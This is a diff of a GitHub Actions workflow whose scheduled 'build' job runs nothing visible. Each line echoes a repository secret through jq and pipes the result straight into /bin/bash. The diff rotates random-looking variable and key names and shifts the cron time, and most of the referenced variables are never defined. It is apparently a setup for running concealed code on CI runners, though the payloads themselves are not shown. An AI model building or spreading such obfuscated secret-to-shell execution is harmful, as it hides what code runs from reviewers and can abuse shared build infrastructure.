@@ -2,35 +2,29 @@ name: duanqirui2603
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
+    - cron: '21 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duanqirui2603
         env:
-          ixk4: ${{ secrets.ixk4 }}
+          xauw604: ${{ secrets.xauw604 }}
         run: |
-          echo $ixk4 | jq -r .yu1 | /bin/bash
-          echo $beza34 | jq -r .lk23 | /bin/bash
-          echo $nxib6104 | jq -r .tguyo280 | /bin/bash
-          echo $xgtxa54518 | jq -r .gi0 | /bin/bash
-          echo $w61 | jq -r .xz742 | /bin/bash
-          echo $g643 | jq -r .p37 | /bin/bash
-          echo $faev0528 | jq -r .jg98878 | /bin/bash
-          echo $godjb79699 | jq -r .arp1772 | /bin/bash
-          echo $fi8974 | jq -r .wzfcr66278 | /bin/bash
-          echo $va49 | jq -r .fejr037 | /bin/bash
-          echo $fvjl3 | jq -r .ghup190 | /bin/bash
-          echo $wz978 | jq -r .e4042 | /bin/bash
-          echo $cd999 | jq -r .ekau849 | /bin/bash
-          echo $r39126 | jq -r .itwg1 | /bin/bash
-          echo $gh2315 | jq -r .eaw1246 | /bin/bash
-          echo $bdslm3 | jq -r .sgc75091 | /bin/bash
-          echo $ltvsg817 | jq -r .iy5 | /bin/bash
-          echo $z623 | jq -r .q204 | /bin/bash
-          echo $xv04919 | jq -r .rvhf9 | /bin/bash
-          echo $rgrjd41 | jq -r .qw84 | /bin/bash
+          echo $xauw604 | jq -r .a824 | /bin/bash
+          echo $yec728 | jq -r .ti932 | /bin/bash
+          echo $rdm15674 | jq -r .jw645 | /bin/bash
+          echo $bgox6733 | jq -r .gceok30 | /bin/bash
+          echo $d15603 | jq -r .rsho66 | /bin/bash
+          echo $f10 | jq -r .pw093 | /bin/bash
+          echo $n42175 | jq -r .pbpt6 | /bin/bash
+          echo $kbbo2 | jq -r .fkwq66 | /bin/bash
+          echo $gjid1 | jq -r .z400 | /bin/bash
+          echo $leeep5095 | jq -r .qzrz749 | /bin/bash
+          echo $tmx20 | jq -r .v31399 | /bin/bash
+          echo $kywl07 | jq -r .pbwx2 | /bin/bash
+          echo $lmjv4203 | jq -r .tr3860 | /bin/bash
+          echo $uip2 | jq -r .jb93 | /bin/bash
+          echo $cer1884 | jq -r .cng2141 | /bin/bash
 
